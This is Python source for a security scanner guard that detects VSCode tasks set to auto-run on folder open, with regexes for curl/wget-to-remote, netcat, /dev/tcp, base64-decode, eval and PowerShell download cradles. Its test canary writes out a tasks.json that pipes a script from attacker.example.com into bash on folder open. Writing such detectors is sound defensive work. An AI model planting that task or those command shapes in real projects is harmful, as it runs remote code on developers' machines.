"""Guard: VSCode `tasks.json` auto-executes a task the instant the folder is opened.

VSCode's task runner supports `"runOptions": {"runOn": "folderOpen"}` on any task in
`.vscode/tasks.json`. A task with this option runs its `command` automatically the moment the
folder is opened in VSCode — no click, no terminal confirmation, no explicit "run task" action
from the developer. (VSCode does show a one-time-per-workspace trust prompt on first open of an
unknown folder, but a developer who has already trusted a workspace once — routine the moment
they start working in a repo they cloned — gets zero further prompting on every subsequent open,
including a fresh clone of the same repo pulled by a teammate or CI checkout script.)

This is not a hypothetical: it is the exact secondary propagation mechanism used in the real
2026-05-11 TanStack/Mistral supply-chain attack, alongside poisoning `.claude/settings.json`
`autoApprove` (CVE-2025-53773, already covered by `ai_instruction_poisoning.py`). Where the
`autoApprove` vector needs an AI coding agent in the loop to act on a poisoned instruction, a
`runOn: folderOpen` task needs nothing but VSCode itself — it fires for every developer who opens
the folder, agentic tooling or not.

Design note — surfacing vs. hard-fire (why this guard is not one flat severity):

`runOn: folderOpen` alone is not inherently malicious. Legitimate projects use it deliberately —
an `npm run watch` compiler, a `docker compose up -d` dev-stack bootstrap, a language-server
warm-up. Treating every occurrence as a proven bug would make this guard noisy on ordinary
tooling, the same trade-off `guardrail-architecture`/`bola` already make for an architecturally
ambiguous pattern (see those two guards' own `surfacing = True` declarations). So:

  - **Rule 1 — `folder-open-task` (MEDIUM, surfacing):** any task with `runOn: folderOpen` whose
    `command` does NOT match a known-dangerous shape. This is a review signal — "an auto-running
    task exists, a human should confirm it is the innocuous build/watch step it looks like" — not
    a proven vulnerability, so it is declared via `surfacing_rule_prefixes` rather than a blanket
    `surfacing = True` (only THIS rule is a review signal; Rule 2 below is not).
  - **Rule 2 — `folder-open-suspicious-command` (CRITICAL, hard-fire):** the SAME auto-exec
    trigger, but the task's `command` (or its `args`) also matches a download-and-run / shell-exec
    / obfuscated-payload shape (`curl`/`wget` to a URL, `nc`/`netcat`, `/dev/tcp/`, a base64-decode
    pipe, a real `eval` invocation, or a PowerShell `-enc`/`IEX` download cradle — the same
    category of marker `claude_code_compromise.py`'s reverse-shell/exfil rules key on, kept local
    here rather than imported so this guard's own sandboxed regex set stays self-contained).
    Auto-exec combined with a payload-fetch/exec shape has no legitimate justification; that
    combination is a proven bug, not an architecture to review, so it fires CRITICAL and is NOT
    surfacing. The `eval` and PowerShell-encoded-command checks are operand/context-anchored (not a
    bare `\beval\b`/`-e` substring match): `_SHELL_EVAL` requires `eval` to operate on a dynamic
    `$`/backtick operand, and `_PS_ENCODED_FLAG` fires only with a PowerShell launcher present and no
    `-Command`/`-File` wrapper. See those patterns' own comments for the false-positive shapes the
    anchoring closes (`docker run -e`, `echo -e`, `grep -E`, `npm run model-eval`, `eval-suite`,
    `echo "eval the results"`, a `pwsh -c 'docker run -e …'` wrapper).

Only one finding is emitted per qualifying task (Rule 2 supersedes Rule 1 when both would match).

  - **Rule 3 — `launch-prelaunchtask-chains-dangerous-task` (CRITICAL, hard-fire):** a sibling
    `.vscode/launch.json` debug configuration's `preLaunchTask` names a task this guard already
    flagged as `folder-open-suspicious-command` in the SAME `.vscode/` directory's `tasks.json`.
    Removing `runOptions.runOn: folderOpen` alone does not neutralize the risk when a second,
    independent trigger — starting any debug session (F5) — still reaches the identical dangerous
    command; both paths need to be closed. (Named incident: the 2025 `keyv` npm-package worm used
    exactly this VSCode auto-task-execution surface as a secondary propagation vector; no CVE was
    assigned.)

`.vscode/tasks.json` is genuine JSONC (JSON with Comments — VSCode's own dialect): `//` line
comments and `/* */` block comments are stripped before parsing so a commented-out task doesn't
either mask a real one or itself get mistaken for live JSON. Trailing commas (also legal in
VSCode's JSONC) are tolerated the same way. A file that still fails to parse after that pass is
skipped, never crashes the guard (RecursionError included, mirroring `mcp_config_security.py`'s
own JSON-parsing guard).

Suppress a known-safe task with the inline pragma, written as a JSONC comment (`//` or `/* */`):
    // security: allow-vscode-tasks-auto-exec
It is matched on the `js` comment view (#1040 T5), whose `//` / `/* */` / double-quoted-string grammar
is JSONC's, so the phrase inside a JSON string (a task's `label`, `command` or `args`) does not suppress.
"""
from __future__ import annotations

import contextlib
import json
import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import CanaryPlant, Guard, is_nonproduct_path, iter_files_named, pragma_present, read, rel

_PRAGMA = "security: allow-vscode-tasks-auto-exec"

_STD_FOLDER_OPEN = ["OWASP-LLM:LLM06", "OWASP:A05"]
_STD_SUSPICIOUS = ["OWASP:A03", "OWASP:A08", "CWE-78"]

# A non-localhost host — the same exclusion shape `claude_code_compromise.py`/
# `ai_instruction_poisoning.py` use, so a task that only reaches the dev machine itself
# (a local dev-server health check, e.g. `curl http://localhost:3000`) is not flagged.
# The loopback literal is anchored to a boundary (`:`, `/`, or end) so a lookalike host that
# merely STARTS with it (e.g. `localhost.attacker.example.com`, `127.0.0.1.evil.com`) is NOT
# treated as loopback — an unanchored prefix check would silently downgrade the CRITICAL
# curl-pipe-bash rule to a MEDIUM review note for exactly that bypass.
_NOT_LOOPBACK = r"(?!(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])(?:[:/]|$))"

# Download-and-run / shell-exec / obfuscated-payload shapes. Deliberately a smaller, self
# -contained set (not imported from claude_code_compromise) — this guard only needs to answer
# "does this auto-run command look like a payload fetch/exec", not reconstruct that module's
# full mkfifo/connectedness reasoning.
#
# `-(?:e|enc|EncodedCommand)\b` and `\beval\b` were pulled out of this alternation after Dean's
# review (PR #890, review) found both over-fired on ordinary commands: `-(?:e|enc)` matched
# `docker run -e`/`echo -e`/`grep -E` (any `-e`-flagged tool, not just PowerShell), and `\beval\b`
# matched the "eval" SUBSTRING inside `npm run model-eval`/`eval-suite` — `\b` is satisfied by a
# hyphen boundary, not just whitespace, so a hyphenated identifier containing "eval" was
# indistinguishable from a real shell `eval` invocation. Both are now their own narrower checks
# below (`_PS_ENCODED_FLAG` gated on `_POWERSHELL_CONTEXT` and `not _PS_COMMAND_ARG`, `_SHELL_EVAL`
# anchored on a dynamic `$`/backtick operand).
_SUSPICIOUS_COMMAND = re.compile(
    r"\b(?:curl|wget)\b[^\n]*?https?://" + _NOT_LOOPBACK + r"|"   # download from a remote host
    r"\bnc(?:at)?\b|"                                             # netcat
    r"/dev/tcp/|"                                                 # bash TCP redirection
    r"base64\s+(?:-d|--decode)\b|"                                # decode-and-pipe payloads
    r"\bIEX\b|Invoke-Expression\b|"                                # PowerShell download cradle
    r"certutil\b[^\n]*-decode\b",                                  # LOLBin base64 decode
    re.IGNORECASE,
)

# A PowerShell launcher actually present in the command — `powershell`/`powershell.exe`/`pwsh`/
# `pwsh.exe`. Gates `_PS_ENCODED_FLAG` below so `-e`/`-enc` on an unrelated tool (`docker run -e`,
# `echo -e`, `grep -E`) doesn't read as a PowerShell encoded-command cradle.
_POWERSHELL_CONTEXT = re.compile(r"\b(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b", re.IGNORECASE)  # security: allow-approval-parser-shell-desync

# PowerShell's encoded-command flag `-EncodedCommand`, enumerated in EVERY prefix abbreviation
# PowerShell accepts (it resolves any unambiguous prefix: `-e`, `-ec`, `-en`, `-enc`, … all mean
# `-EncodedCommand` to powershell.exe). The earlier `-(?:e|enc|encodedcommand)\b` matched only 3 of
# the 15 forms, so a cradle written `powershell -ec <b64>`/`-encoded <b64>` slipped to MEDIUM. The
# trailing `\b` keeps this off longer look-alike switches whose next char is a word char, e.g.
# `-ExecutionPolicy` (`-e`+`x`), `-Encoding` (`-enc`+`o`) — those have no word boundary after the
# abbreviation, so none of the alternatives match them.
_PS_ENCODED_FLAG = re.compile(
    r"-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|"
    r"encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\b",
    re.IGNORECASE,
)

# A PowerShell launcher argument that wraps a command string / script — `-Command`/`-c`/`-File`.
# Its presence means any `-e`/`-enc` later in the string belongs to that WRAPPED command
# (`pwsh -c 'docker run -e FOO=bar'`, `powershell -Command "echo -e building"`), not to powershell
# itself — a real `-EncodedCommand` cradle uses neither `-Command` nor `-File` (they are mutually
# exclusive with `-EncodedCommand`), so it never trips this. Gating on `not _PS_COMMAND_ARG`
# suppresses that CRITICAL false positive. (The bare `-f` abbreviation of `-File` is deliberately
# NOT matched — it collides with the ubiquitous `-f` of `rm`/`curl`/`docker`, and matching it could
# suppress a genuine `-enc` cradle merely because the command also chained some `… -f …` tool.)
# Deliberate residual: a `-EncodedCommand` NESTED inside a `-Command` string (`powershell -Command
# "powershell -enc <b64>"`) is no longer read as a cradle here — that contrived double-nesting is
# base64-opaque anyway and is left to the IEX/curl/base64 clauses; disclosed in the wiki "Known
# bypasses".
_PS_COMMAND_ARG = re.compile(r"-(?:c|command|file)\b", re.IGNORECASE)

# Shell `eval` executing DYNAMIC content: `eval` as its own word (not preceded by a word char,
# `.`, `/` or `-`, so `model-eval`/`retrieval`/`scripts/eval` are excluded) followed by whitespace
# and — through an optional wrapping quote — a `$` (variable / `$(...)` / `${...}`), backtick, or
# subshell `(`. This is what a real payload ALWAYS is: `eval $PAYLOAD`, `eval "$(curl …)"`,
# ``eval `…` ``, whether command-initial, after an operator (`cmd && eval $X`), or the first token
# of a wrapped shell string (`bash -c "eval $X"`, `sh -c 'eval $(…)'`) — the single most common way
# a payload is written into a tasks.json. Anchoring on the DYNAMIC operand (rather than only on what
# precedes `eval`) is what lets `bash -c "eval $X"` fire while `echo "eval the results"` and
# `npm test -- --grep 'eval'` stay silent — both have `eval` after a quote, but neither evaluates a
# variable/command-substitution. Residual (disclosed in the wiki): a static-literal `eval foo` with
# no `$`/backtick operand is not matched — an unrealistic payload shape, and one already caught by
# the curl/base64/IEX clauses whenever it carries a real marker.
_SHELL_EVAL = re.compile(r"(?<![\w./-])eval\s+[\"']?[$`(]", re.IGNORECASE)


def _is_suspicious_command(cmd_text: str) -> bool:
    """True if `cmd_text` matches a download-and-run/shell-exec/obfuscated-payload shape."""
    if _SUSPICIOUS_COMMAND.search(cmd_text):
        return True
    if (
        _POWERSHELL_CONTEXT.search(cmd_text)
        and _PS_ENCODED_FLAG.search(cmd_text)
        and not _PS_COMMAND_ARG.search(cmd_text)
    ):
        return True
    return bool(_SHELL_EVAL.search(cmd_text))


_RUN_ON_FOLDER_OPEN_LINE = re.compile(r'"runOn"\s*:\s*"folderOpen"')

# Comment/trailing-comma stripping to make VSCode's JSONC dialect parseable by `json.loads`.
_TRAILING_COMMA = re.compile(r",(\s*[}\]])")


def _strip_jsonc(text: str) -> str:
    """Same-length-ish, quote-aware strip of `//` and `/* */` comments from JSONC text.

    VSCode's `tasks.json`/`settings.json`/`launch.json` dialect allows both comment forms and
    trailing commas; plain `json.loads` rejects all three. Quote-aware so a string VALUE
    containing `//` (a URL in a `command`/`args` entry) is left untouched — a naive
    ``re.sub(r"//.*", "", text)`` would corrupt a command like ``curl https://example.com``.
    """
    out: list[str] = []
    i = 0
    n = len(text)
    in_string = False
    escape = False
    while i < n:
        c = text[i]
        if in_string:
            out.append(c)
            if escape:
                escape = False
            elif c == "\\":
                escape = True
            elif c == '"':
                in_string = False
            i += 1
            continue
        if c == '"':
            in_string = True
            out.append(c)
            i += 1
            continue
        if c == "/" and i + 1 < n and text[i + 1] == "/":
            while i < n and text[i] not in "\r\n":
                i += 1
            continue
        if c == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(c)
        i += 1
    return "".join(out)


def _parse_tasks_jsonc(text: str) -> object | None:
    """Parse VSCode's JSONC dialect, or `None` if it cannot be parsed at all.

    Mirrors `mcp_config_security.py`'s own `json.loads` guard: `RecursionError` is caught too,
    so one hostile deeply-nested file degrades to "skip this file", never a crashed audit."""
    stripped = _TRAILING_COMMA.sub(r"\1", _strip_jsonc(text))
    with contextlib.suppress(json.JSONDecodeError, RecursionError):
        parsed: object = json.loads(stripped)
        return parsed
    return None


def _command_text(task: dict[str, object]) -> str:
    """The task's `command` plus any `args`, flattened to one string for pattern matching."""
    parts: list[str] = []
    command = task.get("command")
    if isinstance(command, str):
        parts.append(command)
    args = task.get("args")
    if isinstance(args, list):
        for a in args:
            if isinstance(a, str):
                parts.append(a)
            elif isinstance(a, dict):
                # VSCode's ShellQuotedString arg shape: {"value": "...", "quoting": "..."}.
                # Pull `value` so a payload spread across quoted-string arg objects is still
                # seen by the suspicious-command pattern (not silently dropped to MEDIUM).
                value = a.get("value")
                if isinstance(value, str):
                    parts.append(value)
    return " ".join(parts)


def _is_folder_open_task(task: object) -> bool:
    if not isinstance(task, dict):
        return False
    run_options = task.get("runOptions")
    if not isinstance(run_options, dict):
        return False
    return run_options.get("runOn") == "folderOpen"


def _prelaunch_task_refs(data: object) -> list[tuple[str, int | None]]:
    """`(task_label, config_index)` for every string `preLaunchTask` in a parsed `launch.json`."""
    if not isinstance(data, dict):
        return []
    configs = data.get("configurations")
    if not isinstance(configs, list):
        return []
    out: list[tuple[str, int | None]] = []
    for idx, cfg in enumerate(configs):
        if not isinstance(cfg, dict):
            continue
        pre = cfg.get("preLaunchTask")
        if isinstance(pre, str) and pre:
            out.append((pre, idx))
    return out


class VscodeTasksAutoExecGuard(Guard):
    id = "vscode-tasks-auto-exec"
    title = "VSCode task auto-executes on folder open with no user confirmation"
    area = "AI agent"
    surfacing_rule_prefixes = ("vscode-tasks-auto-exec/folder-open-task",)

    # .vscode/tasks.json: one task with runOn: folderOpen whose command curls a remote script
    # and pipes it to bash -> fires vscode-tasks-auto-exec/folder-open-suspicious-command
    # (CRITICAL). Must NOT contain: security: allow-vscode-tasks-auto-exec (pragma silences
    # the guard).
    canary_plant = CanaryPlant(
        files={
            ".vscode/tasks.json": (
                "{\n"
                '  "version": "2.0.0",\n'
                '  "tasks": [\n'
                "    {\n"
                '      "label": "bootstrap",\n'
                '      "type": "shell",\n'
                '      "command": "curl -s https://attacker.example.com/setup.sh | bash",\n'
                '      "runOptions": {\n'
                '        "runOn": "folderOpen"\n'
                "      }\n"
                "    }\n"
                "  ]\n"
                "}\n"
            ),
        },
        expects=frozenset({"vscode-tasks-auto-exec/folder-open-suspicious-command"}),
    )

    def applies(self, profile: StackProfile) -> bool:  # noqa: ARG002
        # .vscode/tasks.json can appear in any repo VSCode is used to open — not gated on any
        # detected stack feature, same as the sibling AI-config guards.
        return True

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        # Dangerous (suspicious-command) task labels seen per `.vscode/` directory, for Rule 3's
        # cross-file `launch.json` correlation below.
        dangerous_labels_by_dir: dict[Path, set[str]] = {}
        # respect_gitignore=False (matching ai_instruction_poisoning/claude_code_compromise):
        # .vscode/ is commonly gitignored wholesale, and this guard's own threat model — a
        # malicious PR or poisoned template — can just as easily ship the .gitignore line that
        # would otherwise silence the guard entirely (a failure that presents as success).
        for f in iter_files_named(root, "tasks.json", respect_gitignore=False):
            try:
                parts = f.relative_to(root).parts
            except ValueError:
                continue
            if ".vscode" not in parts:
                continue
            r = rel(root, f)
            if is_nonproduct_path(r, profile.archive_segments):
                continue
            text = read(f)
            if not text or pragma_present(_PRAGMA, text, dialect="js"):
                continue
            data = _parse_tasks_jsonc(text)
            if not isinstance(data, dict):
                continue
            tasks = data.get("tasks")
            if not isinstance(tasks, list):
                continue
            folder_open_tasks = [t for t in tasks if _is_folder_open_task(t)]
            if not folder_open_tasks:
                continue

            # Line numbers: pair each `"runOn": "folderOpen"` occurrence (in file order) with the
            # matching parsed task (in document order) — accurate for the common case (one
            # occurrence per task, no duplicate reordering) and degrades to the file path alone,
            # never a wrong line, if the counts disagree (e.g. an unusual layout).
            lines = [i for i, line in enumerate(text.splitlines(), 1) if _RUN_ON_FOLDER_OPEN_LINE.search(line)]
            same_count = len(lines) == len(folder_open_tasks)

            for idx, task in enumerate(folder_open_tasks):
                label = task.get("label") if isinstance(task.get("label"), str) else "(unlabeled)"
                location = f"{r}:{lines[idx]}" if same_count else r
                cmd_text = _command_text(task)
                if _is_suspicious_command(cmd_text):
                    if label != "(unlabeled)":
                        dangerous_labels_by_dir.setdefault(f.parent, set()).add(label)
                    out.append(Finding(
                        check_id=self.id,
                        severity="critical",
                        title=f"VSCode task '{label}' auto-runs a suspicious command on folder open",
                        location=location,
                        rule="vscode-tasks-auto-exec/folder-open-suspicious-command",
                        standards=list(_STD_SUSPICIOUS),
                        message=(
                            f"The VSCode task '{label}' has `runOptions.runOn: folderOpen` — it "
                            "executes automatically the instant the folder is opened in VSCode, "
                            "with no click, confirmation, or terminal interaction — AND its "
                            "command matches a download-and-run / shell-exec / obfuscated-payload "
                            "shape (curl|wget to a remote host, netcat, a /dev/tcp redirect, a "
                            "base64-decode pipe, eval, or a PowerShell download cradle). This is "
                            "the exact secondary propagation mechanism used in the 2026-05-11 "
                            "TanStack/Mistral supply-chain attack: a poisoned tasks.json runs the "
                            "moment a developer or CI checkout opens the folder, no AI agent or "
                            "human action required."
                        ),
                        remediation=(
                            "Remove the runOn: folderOpen trigger, or replace the command with one "
                            "that does not fetch/decode/execute external content. Audit git history "
                            "for when this task was introduced. If genuinely required, run it "
                            "manually (drop `runOptions`) rather than automatically on folder open."
                        ),
                    ))
                else:
                    out.append(Finding(
                        check_id=self.id,
                        severity="medium",
                        title=f"VSCode task '{label}' auto-runs on folder open — review",
                        location=location,
                        rule="vscode-tasks-auto-exec/folder-open-task",
                        standards=list(_STD_FOLDER_OPEN),
                        message=(
                            f"The VSCode task '{label}' has `runOptions.runOn: folderOpen` — it "
                            "executes automatically the instant the folder is opened in VSCode, "
                            "with no click or confirmation. This is not necessarily malicious "
                            "(build/watch tasks legitimately use it), but it is the same class of "
                            "zero-interaction auto-exec trigger used as a supply-chain propagation "
                            "mechanism in the 2026-05-11 TanStack/Mistral attack. Confirm the "
                            "command is exactly the innocuous build/watch/lint step it looks like."
                        ),
                        remediation=(
                            "Review the task's command. If it is a legitimate build/watch step, no "
                            "action is needed. If it is not required to run automatically, remove "
                            "`runOptions` so it only runs when explicitly invoked. Suppress a "
                            "confirmed-safe task with `// security: allow-vscode-tasks-auto-exec`."
                        ),
                    ))

        if dangerous_labels_by_dir:
            out.extend(self._scan_launch_configs(root, profile, dangerous_labels_by_dir))
        return out

    def _scan_launch_configs(
        self, root: Path, profile: StackProfile, dangerous_labels_by_dir: dict[Path, set[str]],
    ) -> list[Finding]:
        out: list[Finding] = []
        for f in iter_files_named(root, "launch.json", respect_gitignore=False):
            if f.parent not in dangerous_labels_by_dir:
                continue
            r = rel(root, f)
            if is_nonproduct_path(r, profile.archive_segments):
                continue
            text = read(f)
            if not text or pragma_present(_PRAGMA, text, dialect="js"):
                continue
            data = _parse_tasks_jsonc(text)
            dangerous = dangerous_labels_by_dir[f.parent]
            for pre_label, _idx in _prelaunch_task_refs(data):
                if pre_label not in dangerous:
                    continue
                lineno = next(
                    (i for i, line in enumerate(text.splitlines(), 1) if pre_label in line),
                    None,
                )
                location = f"{r}:{lineno}" if lineno else r
                out.append(Finding(
                    check_id=self.id,
                    severity="critical",
                    title=f"launch.json preLaunchTask chains to the dangerous task '{pre_label}'",
                    location=location,
                    rule="vscode-tasks-auto-exec/launch-prelaunchtask-chains-dangerous-task",
                    standards=list(_STD_SUSPICIOUS),
                    message=(
                        f"This debug configuration's `preLaunchTask` runs '{pre_label}', a task "
                        "this guard already flagged as a download-and-run/shell-exec/obfuscated-"
                        "payload shape. Starting ANY debug session (F5) now triggers that same "
                        "command — a second, independent auto-exec path beyond `runOn: "
                        "folderOpen`. Removing the folderOpen trigger alone does not neutralize "
                        "this task (the 2025 `keyv` npm worm used exactly this VSCode "
                        "auto-task-execution surface as a secondary propagation vector)."
                    ),
                    remediation=(
                        "Fix the underlying task first (see the folder-open-suspicious-command "
                        "finding for that task), then confirm no debug configuration's "
                        "preLaunchTask references it either. Suppress with "
                        "`// security: allow-vscode-tasks-auto-exec`."
                    ),
                ))
        return out
